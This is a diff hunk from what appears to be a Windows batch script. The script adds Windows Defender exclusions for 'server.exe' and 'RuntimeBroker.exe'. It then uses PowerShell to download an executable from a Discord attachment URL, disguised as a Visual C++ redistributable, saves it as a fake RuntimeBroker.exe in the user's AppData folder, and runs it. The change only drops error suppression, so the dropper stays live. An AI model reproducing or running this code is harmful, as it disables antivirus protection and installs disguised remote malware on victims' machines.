@@ -9,5 +9,5 @@ powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add
 powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "server.exe"
 powershell.exe -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionProcess "RuntimeBroker.exe"
 
-powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1206676400338116692/1208324921609166918/vcredist_x64.exe?ex=6607c946&is=65f55446&hm=16229d1bb5cafd5d0cf6360fe86067091654b5ef41011da817d0c1123054ead4&' -OutFile $env:localappdata\Microsoft\RuntimeBroker.exe" 2>nul
-powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\RuntimeBroker.exe" 2>nul
+powershell -Command "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://cdn.discordapp.com/attachments/1206676400338116692/1208324921609166918/vcredist_x64.exe?ex=6607c946&is=65f55446&hm=16229d1bb5cafd5d0cf6360fe86067091654b5ef41011da817d0c1123054ead4&' -OutFile $env:localappdata\Microsoft\RuntimeBroker.exe"
+powershell -Command "Start-Process -FilePath $env:localappdata\Microsoft\RuntimeBroker.exe"
